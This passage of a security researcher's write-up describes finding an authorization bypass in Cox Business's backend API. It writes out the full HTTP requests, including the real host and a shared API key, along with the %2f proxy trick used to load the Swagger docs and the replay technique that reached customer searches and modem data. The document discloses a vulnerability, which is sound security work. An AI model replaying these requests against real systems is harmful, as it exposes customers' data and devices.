<span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64;</span> <span class="hljs-string">rv:124.0)</span> <span class="hljs-string">Gecko/20100101</span> <span class="hljs-string">Firefox/124.0</span>
<span class="hljs-attr">Accept:</span> <span class="hljs-string">application/json,</span> <span class="hljs-string">text/plain,</span> <span class="hljs-string">*/*</span>
<span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span>
<span class="hljs-attr">Clientid:</span> <span class="hljs-string">cbmauser</span>
<span class="hljs-attr">Apikey:</span> <span class="hljs-string">5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span class="hljs-attr">Cb_session:</span> <span class="hljs-string">unauthenticateduser</span>
<span class="hljs-attr">Authorization:</span> <span class="hljs-string">Bearer</span> <span class="hljs-string">undefined</span>
<span class="hljs-attr">Ma_transaction_id:</span> <span class="hljs-string">a85dc5e0-bd9d-4f0d-b4ae-4e284351e4b4</span>
<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">28</span>
<span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span>

{<span class="hljs-string">&quot;email&quot;</span><span class="hljs-string">:&quot;test@example.com&quot;</span>}
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>
<span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span>
<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">126</span>

{
  <span class="hljs-attr">&quot;message&quot;:</span> <span class="hljs-string">&quot;Success&quot;</span>,
  <span class="hljs-attr">&quot;id&quot;:</span> <span class="hljs-string">&quot;test@example.com&quot;</span>
}
</code></pre>
<p>The HTTP request contained a bunch of different authorization headers including what looked to be a general-use API key that was shared between users. The <code class="__className_8a4d12">clientid</code> and <code class="__className_8a4d12">Cb_session</code> keys looked very custom and indicated there were multiple roles and permissions used in the application.</p>
<p>The HTTP response looked like a generic Spring response, and we could likely quickly confirm that the backend API was running spring by simply changing the POST to GET and observing the response:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">500</span> <span class="hljs-string">Internal</span> <span class="hljs-string">Server</span> <span class="hljs-string">Error</span>
<span class="hljs-attr">Content-type:</span> <span class="hljs-string">application/json</span>

{
  <span class="hljs-attr">&quot;timestamp&quot;:</span> <span class="hljs-string">&quot;2024-04-12T08:57:14.384+00:00&quot;</span>,
  <span class="hljs-attr">&quot;status&quot;:</span> <span class="hljs-number">500</span>,
  <span class="hljs-attr">&quot;error&quot;:</span> <span class="hljs-string">&quot;Internal Server Error&quot;</span>,
  <span class="hljs-attr">&quot;path&quot;:</span> <span class="hljs-string">&quot;/services/profile/validate/v1/email&quot;</span>
}
</code></pre>
<p>Yup, that was definitely a Spring error. Since we could confirm that the reverse proxy was running Spring, I decided to look for actuators and exposed API docs.</p>
<p>I went ahead and tried to guess the actuator route:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/validate/v1/email/actuator/</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/validate/v1/actuator/</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/validate/actuator/</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/actuator/</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/actuator/</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/actuator/</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/actuator/</span>
</code></pre>
<p>Shame, no easy actuators. I then checked for accessible API documentation:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/validate/v1/email/swagger-ui/index.html</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/validate/v1/swagger-ui/index.html</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/validate/swagger-ui/index.html</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/profile/swagger-ui/index.html</span>
<span class="hljs-string">❌</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/swagger-ui/index.html</span>
<span class="hljs-string">✅</span> <span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/swagger-ui/index.html</span>
</code></pre>
<p>We had a hit! There was a swagger landing page at <code class="__className_8a4d12">/api/cbma/profile/swagger-ui/index.html</code>. I loaded the page expecting to see API routes, however...</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>Totally empty. Something was causing the page not to load. I checked the network traffic and there seemed to be in an infinite redirect loop when attempting to load any static resource:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Location:</span> <span class="hljs-string">/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
<span class="hljs-string">...</span>
<span class="hljs-string">GET</span> <span class="hljs-string">/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Location:</span> <span class="hljs-string">/cbma/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
</code></pre>
<p>It seemed that requests to load static resources for the page (<code class="__className_8a4d12">.png</code>, <code class="__className_8a4d12">.js</code>, <code class="__className_8a4d12">.css</code>) were all being routed through the base URI instead of the reverse proxy API host. What this meant was there was probably a proxy rule for static assets, so I changed the extension to test this:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.anythingElse</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">500</span> <span class="hljs-string">Internal</span> <span class="hljs-string">Server</span> <span class="hljs-string">Error</span>
<span class="hljs-attr">Server:</span> <span class="hljs-string">nginx</span>
</code></pre>
<p>After confirming that the <code class="__className_8a4d12">.js</code> extension was triggering the routing of the request to the original host, we now needed to find a way to load the resource from the API reverse proxy but without hitting the rule condition which switched routing for static files. The simplest way to do this, since the request was being proxied, was to check if there was any character that we could add which would “drop off” in transit.</p>
<h3 id="loading-static-resources-from-reverse-proxy-api">Loading Static Resources from Reverse Proxy API</h3>
<p>To fuzz this, I simply used Burp’s intruder to enumerate from <code class="__className_8a4d12">%00</code> to <code class="__className_8a4d12">%FF</code> at the end of the URL. After about 30 seconds of running, we had a 200 OK by appending the URL encoded <code class="__className_8a4d12">/</code> symbol:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">2</span> <span class="hljs-number">200</span> <span class="hljs-variable constant_">OK</span>
<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: application/javascript

<span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) { <span class="hljs-variable language_">window</span>.<span class="hljs-property">ui</span> = <span class="hljs-title class_">SwaggerUIBundle</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;https://petstore.swagger.io/v2/swagger.json&quot;</span>, <span class="hljs-attr">dom_id</span>: <span class="hljs-string">&#x27;#swagger-ui&#x27;</span>, <span class="hljs-attr">deepLinking</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">presets</span>: [ <span class="hljs-title class_">SwaggerUIBundle</span>.<span class="hljs-property">presets</span>.<span class="hljs-property">apis</span>, <span class="hljs-title class_">SwaggerUIStandalonePreset</span> ], <span class="hljs-attr">plugins</span>: [ <span class="hljs-title class_">SwaggerUIBundle</span>.<span class="hljs-property">plugins</span>.<span class="hljs-property">DownloadUrl</span> ], <span class="hljs-attr">layout</span>: <span class="hljs-string">&quot;StandaloneLayout&quot;</span> , <span class="hljs-string">&quot;configUrl&quot;</span> : <span class="hljs-string">&quot;/services/v3/api-docs/swagger-config&quot;</span>, <span class="hljs-string">&quot;validatorUrl&quot;</span> : <span class="hljs-string">&quot;&quot;</span> }); <span class="hljs-comment">//&lt;/editor-fold&gt; };</span>
</code></pre>
<p>By appending the <code class="__className_8a4d12">%2f</code> to the <code class="__className_8a4d12">.js</code> extension, we could load the JS files. I wrote a rule to append <code class="__className_8a4d12">%2f</code> to all static resources using Burp’s match-and-replace then reloaded the page.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>Perfect, the swagger routes had loaded. I used the same trick to load all the swagger docs on all of the other API endpoints. In total, there were about 700 different API calls with each API having the following number of calls:</p>
<pre><code class="__className_8a4d12">account (115 routes)
voiceutilities (73 routes)
user (70 routes)
datainternetgateway (57 routes)
accountequipment (55 routes)
billing (53 routes)
ticket (52 routes)
profile (47 routes)
voicecallmanagement (46 routes)
voicemail (37 routes)
voiceusermanagement (30 routes)
userauthorization (24 routes)
csr (16 routes)
voiceprofile (14 routes)
</code></pre>
<p>After quickly skimming through everything, the following APIs appeared to have the most functionality for interacting with hardware and accessing customer accounts:</p>
<pre><code class="__className_8a4d12">accountequipment (55 routes)
datainternetgateway (57 routes)
account (115 routes)
</code></pre>
<p>Copying the HTTP request that I’d used to register to the website, I ran an intruder script to hit every single GET endpoint to check if there were any accessible unauthenticated API endpoints. What came back was really interesting. There was a 50/50 split of endpoints which gave an authorization error or 200 OK HTTP response.</p>
<h3 id="accidentally-discovering-an-authorization-bypass-on-the-cox-backend-api">Accidentally Discovering an Authorization Bypass on the Cox Backend API</h3>
<p>After the intruder scan of all of the API endpoints completed, I scrolled through to see if any had any interesting responses. The following &quot;profilesearch&quot; endpoint had an interesting HTTP response which appeared to be returning a blank JSON object from what looked to be an empty search:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/profile/services/profile/profilesearch/</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
<span class="hljs-attr">Clientid:</span> <span class="hljs-string">cbmauser</span>
<span class="hljs-attr">Apikey:</span> <span class="hljs-string">5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span class="hljs-attr">Cb_session:</span> <span class="hljs-string">unauthenticateduser</span>
<span class="hljs-attr">Authorization:</span> <span class="hljs-string">Bearer</span> <span class="hljs-string">undefined</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>
<span class="hljs-attr">Content-type:</span> <span class="hljs-string">application/json</span>

{
  <span class="hljs-attr">&quot;message&quot;:</span> <span class="hljs-string">&quot;Success&quot;</span>,
  <span class="hljs-attr">&quot;profile&quot;:</span> {
    <span class="hljs-attr">&quot;numberofRecords&quot;:</span> <span class="hljs-string">&quot;0 hits&quot;</span>,
    <span class="hljs-attr">&quot;searchList&quot;:</span> []
  }
}
</code></pre>
<p>From looking at the JavaScript, it seemed that we’d need to add an argument to the URI for a profile to search for. I went ahead and typed in <code class="__className_8a4d12">test</code> into the URI and got the following response:</p>
<pre><code class="__className_8a4d12"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Authorization Error-Invalid User Token&quot;</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>Invalid user token? But I’d just been able to hit this endpoint? I removed the word <code class="__className_8a4d12">test</code> from the URI and resent this request. Another authorization error! For some reason, the original endpoint without parameters was now returning an authorization error even though we could just hit it when running intruder.</p>
<p>I did a sanity check and confirmed that nothing had changed between the request in intruder and my repeater request. I replayed the request one more time, but surprisingly this time it gave me the original 200 OK and the JSON response from intruder! What was going on? It seemed to be intermittently giving me authorization errors or saying that the request had been successful.</p>
<p>To test if I could reproduce this with an actual search query, I wrote down <code class="__className_8a4d12">cox</code> in the URI and replayed the request 2-3 more times until I saw the following response:</p>
<pre><code class="__className_8a4d12"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Success&quot;</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;profile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">&quot;numberofRecords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000+ hits&quot;</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">&quot;searchList&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;COX REDACTED&quot;</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">&quot;profileGuid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cbbccdae-b1ab-4e8c-9cec-e20c425205a1&quot;</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Cox Communications SIP Trunk REDACTED&quot;</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">&quot;profileGuid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;bc2a49c7-0c3f-4cab-9133-de7993cb1c7d&quot;</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cox test account ds1/REDACTED&quot;</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">&quot;profileGuid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;74551032-e703-46a2-a252-dc75d6daeedc&quot;</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>Woah! These looked like profiles of Cox business customers. Not really expecting results, I replaced the word &quot;cox&quot; with &quot;fbi&quot; to see if it was actually pulling customer data:</p>
<pre><code class="__className_8a4d12"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Success&quot;</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">&quot;profile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">&quot;numberofRecords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;REDACTED hits&quot;</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">&quot;searchList&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;FBI REDACTED&quot;</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">&quot;profileGuid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;7b9f092a-e938-41d5-bcf5-0be1bb6487f5&quot;</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;FBI REDACTED&quot;</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">&quot;profileGuid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c8923f6f-b4ed-4f66-a743-000a961edb35&quot;</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;FBI REDACTED&quot;</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">&quot;profileGuid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a32b8112-48ac-4a4f-8893-5ca1c392a31d&quot;</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>Oh, no. The above response contained the physical addresses of several FBI field offices who were Cox business customers. The administrative customer search API request was working. Not good!</p>
<p>We had confirmed that we could bypass authorization for the API endpoints by simply replaying the HTTP request multiple times, and there were over 700 other API requests that we could hit. It was time to see what the real impact was.</p>
<h3 id="confirming-we-can-access-anyones-equipment">Confirming We Can Access Anyone&#x27;s Equipment</h3>
<p>I looked back at the results of the intruder scan, now knowing that I could bypass authorization by simply replaying a request. In order to figure out if this vulnerability could&#x27;ve been used to hack my modem, I needed to know if this API had access to the residential network at an access control level. Cox offered both residential and business services, but under the hood, I was guessing that the underlying API had access to both.</p>
<p>I went ahead and pulled out the simplest looking request that took in a <code class="__className_8a4d12">macAddress</code> parameter to test if I could access my own modem via the API.</p>
<pre><code class="__className_8a4d12">/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=:mac
</code></pre>
<p>This was a GET request to retrieve a modem IP address that required a <code class="__className_8a4d12">macAddress</code> parameter. I logged into Cox, retrieved my own MAC address, then sent the HTTP request over-and-over until it returned 200 OK:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
<span class="hljs-attr">Clientid:</span> <span class="hljs-string">cbmauser</span>
<span class="hljs-attr">Apikey:</span> <span class="hljs-string">5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span class="hljs-attr">Cb_session:</span> <span class="hljs-string">unauthenticateduser</span>
<span class="hljs-attr">Authorization:</span> <span class="hljs-string">Bearer</span> <span class="hljs-string">undefined</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>
<span class="hljs-attr">Content-type:</span> <span class="hljs-string">application/json</span>

{
  <span class="hljs-attr">&quot;message&quot;:</span> <span class="hljs-string">&quot;Success&quot;</span>,
  <span class="hljs-attr">&quot;ipv4&quot;:</span> <span class="hljs-string">&quot;98.165.155.8&quot;</span>
}
</code></pre>
<p>It worked! We were accessing our own device through the Cox Business website API! This meant that whatever was running on this could actually be used to talk to the devices. Cox provided service to millions of customers, and this API seemingly allowed me to directly communicate via MAC address with anyone&#x27;s device.</p>
<p>The next question I had was whether or not we could retrieve the MAC addresses of the hardware connected to someone&#x27;s account via searching their account ID (which we had retrieved previously through the customer query endpoint). I found the <code class="__className_8a4d12">accountequipment/services/accountequipment/v1/equipments</code> endpoint in my swagger list and threw it in my Burp Repeater with my own account ID. It returned the following information:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/accountequipment/services/accountequipment/v1/equipments/435008132203</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
<span class="hljs-attr">Clientid:</span> <span class="hljs-string">cbmauser</span>
<span class="hljs-attr">Apikey:</span> <span class="hljs-string">5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span class="hljs-attr">Cb_session:</span> <span class="hljs-string">unauthenticateduser</span>
<span class="hljs-attr">Authorization:</span> <span class="hljs-string">Bearer</span> <span class="hljs-string">undefined</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>
<span class="hljs-attr">Content-type:</span> <span class="hljs-string">application/json</span>

{
  <span class="hljs-attr">&quot;accountEquipmentList&quot;:</span> [
    {
      <span class="hljs-attr">&quot;equipmentCategory&quot;:</span> <span class="hljs-string">&quot;Internet&quot;</span>,
      <span class="hljs-attr">&quot;equipmentModelMake&quot;:</span> <span class="hljs-string">&quot;NOKIA G-010G-A&quot;</span>,
      <span class="hljs-attr">&quot;equipmentName&quot;:</span> <span class="hljs-string">&quot;NOKIA G-010G-A&quot;</span>,
      <span class="hljs-attr">&quot;equipmentType&quot;:</span> <span class="hljs-string">&quot;Nokia ONT&quot;</span>,
      <span class="hljs-attr">&quot;itemModelMake&quot;:</span> <span class="hljs-string">&quot;NOKIA&quot;</span>,
      <span class="hljs-attr">&quot;itemModelNumber&quot;:</span> <span class="hljs-string">&quot;G-010G-A&quot;</span>,
      <span class="hljs-attr">&quot;itemNumber&quot;:</span> <span class="hljs-string">&quot;DAL10GB&quot;</span>,
      <span class="hljs-attr">&quot;macAddress&quot;:</span> <span class="hljs-string">&quot;f8:0c:58:bb:cb:92&quot;</span>,
      <span class="hljs-attr">&quot;portList&quot;:</span> [
        {
          <span class="hljs-attr">&quot;address&quot;:</span> <span class="hljs-string">&quot;F80C58BBCB92&quot;</span>,
          <span class="hljs-attr">&quot;portNumber&quot;:</span> <span class="hljs-string">&quot;1&quot;</span>,
          <span class="hljs-attr">&quot;portType&quot;:</span> <span class="hljs-string">&quot;ONT_ALU&quot;</span>,
          <span class="hljs-attr">&quot;qualityAssuranceDate&quot;:</span> <span class="hljs-string">&quot;20220121&quot;</span>,
          <span class="hljs-attr">&quot;serviceCategoryDescription&quot;:</span> <span class="hljs-string">&quot;Data&quot;</span>
        }
      ],
      <span class="hljs-attr">&quot;serialNumber&quot;:</span> <span class="hljs-string">&quot;ALCLEB313C84&quot;</span>
    },
    {
      <span class="hljs-attr">&quot;equipmentCategory&quot;:</span> <span class="hljs-string">&quot;Voice&quot;</span>,
      <span class="hljs-attr">&quot;equipmentModelMake&quot;:</span> <span class="hljs-string">&quot;CISCO DPQ3212&quot;</span>,
      <span class="hljs-attr">&quot;equipmentName&quot;:</span> <span class="hljs-string">&quot;CISCO DPQ3212&quot;</span>,
      <span class="hljs-attr">&quot;equipmentType&quot;:</span> <span class="hljs-string">&quot;Cable Modem&quot;</span>,
      <span class="hljs-attr">&quot;itemModelMake&quot;:</span> <span class="hljs-string">&quot;CISCO&quot;</span>,
      <span class="hljs-attr">&quot;itemModelNumber&quot;:</span> <span class="hljs-string">&quot;DPQ3212&quot;</span>,
      <span class="hljs-attr">&quot;itemNumber&quot;:</span> <span class="hljs-string">&quot;DSA321N&quot;</span>,
      <span class="hljs-attr">&quot;macAddress&quot;:</span> <span class="hljs-string">&quot;e4:48:c7:0d:9a:71&quot;</span>,
      <span class="hljs-attr">&quot;portList&quot;:</span> [
        {
          <span class="hljs-attr">&quot;address&quot;:</span> <span class="hljs-string">&quot;E448C70D9A71&quot;</span>,
          <span class="hljs-attr">&quot;portNumber&quot;:</span> <span class="hljs-string">&quot;1&quot;</span>,
          <span class="hljs-attr">&quot;portType&quot;:</span> <span class="hljs-string">&quot;DATA_D3&quot;</span>,
          <span class="hljs-attr">&quot;qualityAssuranceDate&quot;:</span> <span class="hljs-string">&quot;20111229&quot;</span>,
          <span class="hljs-attr">&quot;serviceCategoryDescription&quot;:</span> <span class="hljs-string">&quot;Unknown&quot;</span>
        },
        {
          <span class="hljs-attr">&quot;address&quot;:</span> <span class="hljs-string">&quot;E448C70D9A75&quot;</span>,
          <span class="hljs-attr">&quot;portNumber&quot;:</span> <span class="hljs-string">&quot;2&quot;</span>,
          <span class="hljs-attr">&quot;portType&quot;:</span> <span class="hljs-string">&quot;TELEPHONY&quot;</span>,
          <span class="hljs-attr">&quot;qualityAssuranceDate&quot;:</span> <span class="hljs-string">&quot;20111229&quot;</span>,
          <span class="hljs-attr">&quot;serviceCategoryCode&quot;:</span> <span class="hljs-string">&quot;T&quot;</span>,
          <span class="hljs-attr">&quot;serviceCategoryDescription&quot;:</span> <span class="hljs-string">&quot;Telephone&quot;</span>
        }
      ],
      <span class="hljs-attr">&quot;serialNumber&quot;:</span> <span class="hljs-string">&quot;240880144&quot;</span>
    },
    {
      <span class="hljs-attr">&quot;equipmentCategory&quot;:</span> <span class="hljs-string">&quot;Television&quot;</span>,
      <span class="hljs-attr">&quot;equipmentModelMake&quot;:</span> <span class="hljs-string">&quot;Cox Business TV (Contour 1)&quot;</span>,
      <span class="hljs-attr">&quot;equipmentName&quot;:</span> <span class="hljs-string">&quot;Cox Business TV (Contour 1)&quot;</span>,
      <span class="hljs-attr">&quot;equipmentType&quot;:</span> <span class="hljs-string">&quot;Cable Receiver&quot;</span>,
      <span class="hljs-attr">&quot;itemModelMake&quot;:</span> <span class="hljs-string">&quot;CISCO&quot;</span>,
      <span class="hljs-attr">&quot;itemModelNumber&quot;:</span> <span class="hljs-string">&quot;650&quot;</span>,
      <span class="hljs-attr">&quot;itemNumber&quot;:</span> <span class="hljs-string">&quot;GSX9865&quot;</span>,
      <span class="hljs-attr">&quot;macAddress&quot;:</span> <span class="hljs-string">&quot;50:39:55:da:93:05&quot;</span>,
      <span class="hljs-attr">&quot;portList&quot;:</span> [
        {
          <span class="hljs-attr">&quot;address&quot;:</span> <span class="hljs-string">&quot;44E08EBB6DBC&quot;</span>,
          <span class="hljs-attr">&quot;portNumber&quot;:</span> <span class="hljs-string">&quot;1&quot;</span>,
          <span class="hljs-attr">&quot;portType&quot;:</span> <span class="hljs-string">&quot;CHDDVRX1&quot;</span>,
          <span class="hljs-attr">&quot;qualityAssuranceDate&quot;:</span> <span class="hljs-string">&quot;20131108&quot;</span>,
          <span class="hljs-attr">&quot;serviceCategoryDescription&quot;:</span> <span class="hljs-string">&quot;Cable&quot;</span>
        }
      ],
      <span class="hljs-attr">&quot;serialNumber&quot;:</span> <span class="hljs-string">&quot;SACDRVKQN&quot;</span>
    }
  ]
}
</code></pre>
<p>It worked! My connected equipment was returned in the HTTP response.</p>
